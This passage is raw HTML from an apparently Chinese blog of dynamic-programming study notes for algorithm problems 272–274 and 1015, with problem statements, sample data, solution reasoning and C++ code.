class="hljs-keyword">if</span>(j&amp;&amp;j<span class="hljs-number">-1</span>&gt;=k) m+=f[i][j<span class="hljs-number">-1</span>][k][x][y];<br>                            <span class="hljs-keyword">if</span>(k&amp;&amp;k<span class="hljs-number">-1</span>&gt;=x) m+=f[i][j][k<span class="hljs-number">-1</span>][x][y];<br>                            <span class="hljs-keyword">if</span>(x&amp;&amp;x<span class="hljs-number">-1</span>&gt;=y) m+=f[i][j][k][x<span class="hljs-number">-1</span>][y];<br>                            <span class="hljs-keyword">if</span>(y) m+=f[i][j][k][x][y<span class="hljs-number">-1</span>];<br>                        &#125;<br>                        <br>        cout&lt;&lt;f[a[<span class="hljs-number">0</span>]][a[<span class="hljs-number">1</span>]][a[<span class="hljs-number">2</span>]][a[<span class="hljs-number">3</span>]][a[<span class="hljs-number">4</span>]]&lt;&lt;endl;<br><br>    &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="272-最长公共上升子序列"><a href="#272-最长公共上升子序列" class="headerlink" title="272.最长公共上升子序列"></a>272.最长公共上升子序列</h3><p>熊大妈的奶牛在小沐沐的熏陶下开始研究信息题目。</p><p>小沐沐先让奶牛研究了最长上升子序列，再让他们研究了最长公共子序列，现在又让他们研究最长公共上升子序列了。</p><p>小沐沐说，对于两个数列 A 和 B，如果它们都包含一段位置不一定连续的数，且数值是严格递增的，那么称这一段数是两个数列的公共上升子序列，而所有的公共上升子序列中最长的就是最长公共上升子序列了。</p><p>奶牛半懂不懂，小沐沐要你来告诉奶牛什么是最长公共上升子序列。</p><p>不过，只要告诉奶牛它的长度就可以了。</p><p>数列 A 和 B 的长度均不超过 3000。</p><h4 id="输入格式-4"><a href="#输入格式-4" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行包含一个整数 N，表示数列 A，B 的长度。</p><p>第二行包含 N 个整数，表示数列 A。</p><p>第三行包含 N 个整数，表示数列 B。</p><h4 id="输出格式-4"><a href="#输出格式-4" class="headerlink" title="输出格式"></a>输出格式</h4><p>输出一个整数，表示最长公共上升子序列的长度。</p><h4 id="数据范围-4"><a href="#数据范围-4" class="headerlink" title="数据范围"></a>数据范围</h4><p>1≤N≤3000,序列中的数字均不超过 2^31−1。</p><h4 id="输入样例：-5"><a href="#输入样例：-5" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">4</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h4 id="输出样例：-5"><a href="#输出样例：-5" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">2<br></code></pre></td></tr></table></figure><p>朴素版做法：(时间超限)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">3010</span>;<br><br><span class="hljs-type">int</span> A[N],B[N];<br><span class="hljs-type">int</span> f[N][N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//输入初始数据</span><br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;A[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;B[i];<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>        &#123;<br>            f[i][j]=f[i<span class="hljs-number">-1</span>][j];<br>            <span class="hljs-keyword">if</span>(A[i]==B[j])<br>            &#123;<br>                <span class="hljs-type">int</span> maxv=<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">1</span>;k&lt;j;k++)<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(B[k]&lt;B[j]) maxv=<span class="hljs-built_in">max</span>(maxv,f[i<span class="hljs-number">-1</span>][k]+<span class="hljs-number">1</span>);<br>                &#125;<br>                f[i][j]=<span class="hljs-built_in">max</span>(f[i][j],maxv);<br>            &#125;<br>        &#125;<br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) res=<span class="hljs-built_in">max</span>(res,f[n][i]);<br>    <br>    cout&lt;&lt;res&lt;&lt;endl;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>       <br>&#125;<br><br></code></pre></td></tr></table></figure><p>优化：二维</p><p>思路：对朴素版代码的优化，用A[i]代替B[j]，来筛选小于B[j]时 更新maxv=max(maxv,f[i-1][j]+1),然后在A[i]==B[j]时将maxv 放入比较中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">3010</span>;<br><br><span class="hljs-type">int</span> A[N],B[N];<br><span class="hljs-type">int</span> f[N][N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//输入初始数据</span><br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;A[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;B[i];<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> maxv=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>        &#123;<br>            f[i][j]=f[i<span class="hljs-number">-1</span>][j];<br>            <span class="hljs-keyword">if</span>(A[i]==B[j]) f[i][j]=<span class="hljs-built_in">max</span>(maxv,f[i][j]);<br>            <span class="hljs-keyword">if</span>(A[i]&gt;B[j]) maxv=<span class="hljs-built_in">max</span>(maxv,f[i<span class="hljs-number">-1</span>][j]+<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>        <br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) res=<span class="hljs-built_in">max</span>(res,f[n][i]);<br>    <br>    cout&lt;&lt;res&lt;&lt;endl;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="273-分级"><a href="#273-分级" class="headerlink" title="273.分级"></a>273.分级</h3><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202303191633914.png" alt="image-20230319163335711"></p><h4 id="输入样例：-6"><a href="#输入样例：-6" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs">7<br>1<br>3<br>2<br>4<br>5<br>3<br>9<br></code></pre></td></tr></table></figure><h4 id="输出样例：-6"><a href="#输出样例：-6" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">3<br></code></pre></td></tr></table></figure><h4 id="思路：-4"><a href="#思路：-4" class="headerlink" title="思路："></a>思路：</h4><p>关键性质：一定存在一组最优解B[i],使得每一个B[i]都在A[]数组中出现过</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202303191656522.png" alt="image-20230319165634326"></p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202303191930108.png" alt="image-20230319193012965"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-comment">//#include&lt;cstdio&gt;</span><br><span class="hljs-comment">//#include&lt;cstring&gt;</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">2010</span>,INF=<span class="hljs-number">0x3f3f3f3f</span>;<br><br><span class="hljs-type">int</span> a[N],b[N];<br><span class="hljs-comment">//用b[N]表示排序好的a数组；</span><br><br><span class="hljs-type">int</span> f[N][N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">def</span><span class="hljs-params">()</span></span>&#123;<br>    <br>    <span class="hljs-type">int</span> res=INF;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> minv=INF;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>        &#123;<br>            minv=<span class="hljs-built_in">min</span>(minv,f[i<span class="hljs-number">-1</span>][j]);<br>            f[i][j]=minv+<span class="hljs-built_in">abs</span>(a[i]-b[j]);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) res=<span class="hljs-built_in">min</span>(res,f[n][i]);<br>    <br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        cin&gt;&gt;a[i];<br>        b[i]=a[i];<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(b+<span class="hljs-number">1</span>,b+n+<span class="hljs-number">1</span>);<br>    <span class="hljs-type">int</span> res1=<span class="hljs-built_in">def</span>();<br>    <span class="hljs-built_in">reverse</span>(a+<span class="hljs-number">1</span>,a+n+<span class="hljs-number">1</span>);<br>    <span class="hljs-type">int</span> res2=<span class="hljs-built_in">def</span>();<br>    <br>    cout&lt;&lt;<span class="hljs-built_in">min</span>(res1,res2)&lt;&lt;endl;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="274-移动服务"><a href="#274-移动服务" class="headerlink" title="274.移动服务"></a>274.移动服务</h3><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202303201558624.png" alt="image-20230320155833537"></p><h4 id="输入样例：-7"><a href="#输入样例：-7" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">5 </span><span class="hljs-number">9</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">0</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">4</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">1</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">1</span> <span class="hljs-number">5</span> <span class="hljs-number">4</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="输出样例：-7"><a href="#输出样例：-7" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">5<br></code></pre></td></tr></table></figure><h4 id="思路：-5"><a href="#思路：-5" class="headerlink" title="思路："></a>思路：</h4><p>1）利用一定有个服务员在要到达的那个点来降维</p><p>f[i][x][y][z]—&gt;f[i][x][y]  z=p[i];</p><p>2）动态规划有两种找状态转移方程的方法：<br>    1.用其依赖的状态来更新当前状态（即入度</p><p>​    2.用当前状态更新依赖它的状态（即出度</p><p>​    这题的出度始终是三个，而入度非常复杂，所以用方法2更新</p><p>3）</p><p>状态表示：f[i][x][y] 表示所有已经处理完前i个请求，且另外两个服务员在x,y的所有安排的集合；其值取路线花费之和的最小值</p><p>状态计算：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++">z=p[i];<br><span class="hljs-comment">//z去</span><br>f[i+<span class="hljs-number">1</span>][x][y]=<span class="hljs-built_in">min</span>(f[i+<span class="hljs-number">1</span>][x][y],v+c[z][p[i+<span class="hljs-number">1</span>]]);<br><span class="hljs-comment">//x去</span><br>f[i+<span class="hljs-number">1</span>][z][y]=<span class="hljs-built_in">min</span>(f[i+<span class="hljs-number">1</span>][z][y],v+c[x][p[i+<span class="hljs-number">1</span>]]);<br><span class="hljs-comment">//y去</span><br>f[i+<span class="hljs-number">1</span>][x][z]=<span class="hljs-built_in">min</span>(f[i+<span class="hljs-number">1</span>][x][z],v+c[y][p[i+<span class="hljs-number">1</span>]]);<br></code></pre></td></tr></table></figure><p>4)初始化</p><p>要指明用任务点表示的那个服务员的初始位置，1，2，3任意都行</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++">p[<span class="hljs-number">0</span>]=<span class="hljs-number">3</span>;<br>f[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]=<span class="hljs-number">0</span>;<br>或者<br>p[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>f[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]=<span class="hljs-number">0</span>;<br>或者<br>p[<span class="hljs-number">0</span>]=<span class="hljs-number">2</span>;<br>f[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>][<span class="hljs-number">3</span>]=<span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><h4 id="代码：-3"><a href="#代码：-3" class="headerlink" title="代码："></a>代码：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1010</span>,L=<span class="hljs-number">210</span>;<br><br><span class="hljs-type">int</span> f[N][L][L];<br><span class="hljs-type">int</span> p[N];<br><span class="hljs-type">int</span> c[L][L];<br><span class="hljs-type">int</span> n,m;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <br>    <span class="hljs-comment">//初始化c[i][j] p[i]</span><br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>            cin&gt;&gt;c[i][j];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++) cin&gt;&gt;p[i];<br>    <br>    <span class="hljs-comment">//由于是求最小值，将数组初始化到最大；</span><br>    <span class="hljs-built_in">memset</span>(f,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> f);<br>    <br>    <span class="hljs-comment">//假设第0个请求是在3</span><br>    p[<span class="hljs-number">0</span>]=<span class="hljs-number">3</span>;<br>    f[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]=<span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">//由于是根据出度更新状态，i要从0开始</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=m;i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> x=<span class="hljs-number">1</span>;x&lt;=n;x++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> y=<span class="hljs-number">1</span>;y&lt;=n;y++)&#123;<br>                <span class="hljs-type">int</span> z=p[i],u=p[i+<span class="hljs-number">1</span>],v=f[i][x][y];<br>                <span class="hljs-comment">//服务员不能出现在同一个位置</span><br>                <span class="hljs-keyword">if</span>(x==y||x==z||y==z) <span class="hljs-keyword">continue</span>;<br>                <br>                <span class="hljs-comment">//z去</span><br>                f[i+<span class="hljs-number">1</span>][x][y]=<span class="hljs-built_in">min</span>(f[i+<span class="hljs-number">1</span>][x][y],v+c[z][u]);<br>                <span class="hljs-comment">//x去</span><br>                f[i+<span class="hljs-number">1</span>][z][y]=<span class="hljs-built_in">min</span>(f[i+<span class="hljs-number">1</span>][z][y],v+c[x][u]);<br>                <span class="hljs-comment">//y去</span><br>                f[i+<span class="hljs-number">1</span>][x][z]=<span class="hljs-built_in">min</span>(f[i+<span class="hljs-number">1</span>][x][z],v+c[y][u]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0x3f3f3f3f</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=n;i++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=n;j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(i==j||i==p[m]||j==p[m])<br>            <span class="hljs-keyword">continue</span>;<br>            res=<span class="hljs-built_in">min</span>(res,f[m][i][j]);<br>        &#125;<br>        <br>    cout&lt;&lt;res;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1015-摘花生（数字三角形模型）"><a href="#1015-摘花生（数字三角形模型）" class="headerlink" title="1015.摘花生（数字三角形模型）"></a>1015.摘花生（数字三角形模型）</h3><p>Hello Kitty想摘点花生送给她喜欢的米老鼠。</p><p>她来到一片有网格状道路的矩形花生地(如下图)，从西北角进去，东南角出来。</p><p>地里每个道路的交叉点上都有种着一株花生苗，上面有若干颗花生，经过一株花生苗就能摘走该它上面所有的花生。</p><p>Hello Kitty只能向东或向南走，不能向西或向北走。</p><p>问Hello Kitty最多能够摘到多少颗花生。</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202303212039650.gif" alt="1.gif"></p><h4 id="输入格式-5"><a href="#输入格式-5" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行是一个整数T，代表一共有多少组数据。</p><p>接下来是T组数据。</p><p>每组数据的第一行是两个整数，分别代表花生苗的行数R和列数 C。</p><p>每组数据的接下来R行数据，从北向南依次描述每行花生苗的情况。每行数据有C个整数，按从西向东的顺序描述了该行每株花生苗上的花生数目M。</p><h4 id="输出格式-5"><a href="#输出格式-5" class="headerlink" title="输出格式"></a>输出格式</h4><p>对每组输入数据，输出一行，内容为Hello Kitty能摘到得最多的花生颗数。</p><h4 id="数据范围-5"><a href="#数据范围-5" class="headerlink" title="数据范围"></a>数据范围</h4><p>1≤T≤100<br>1≤R,C≤100<br>0≤M≤1000</p><h4 id="输入样例：-8"><a href="#输入样例：-8" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">2</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">2</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">1</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">4</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">6</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h4 id="输出样例：-8"><a href="#输出样例：-8" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">8<br>16<br></code></pre></td></tr></table></figure><h4 id="代码：-4"><a href="#代码：-4" class="headerlink" title="代码："></a>代码：</h4><p>思路比较简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">110</span>;<br><span class="hljs-type">int</span> t;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cin&gt;&gt;t;<br>    <span class="hljs-keyword">while</span>(t--)&#123;<br>        <span class="hljs-type">int</span> r, c;<br>        <span class="hljs-type">int</span> w[N][N], f[N][N];<br>        cin&gt;&gt;r&gt;&gt;c;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=r;i++)<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=c;j++)<br>                cin&gt;&gt;w[i][j];<br>        <br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=r;i++)<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=c;j++)<br>            &#123;<br>                f[i][j]=<span class="hljs-built_in">max</span>(f[i<span class="hljs-number">-1</span>][j],f[i][j<span class="hljs-number">-1</span>])+w[i][j];<br>            &#125;<br>        cout&lt;&lt;f[r][c]&lt;&lt;endl;<br>    &#125;<br>    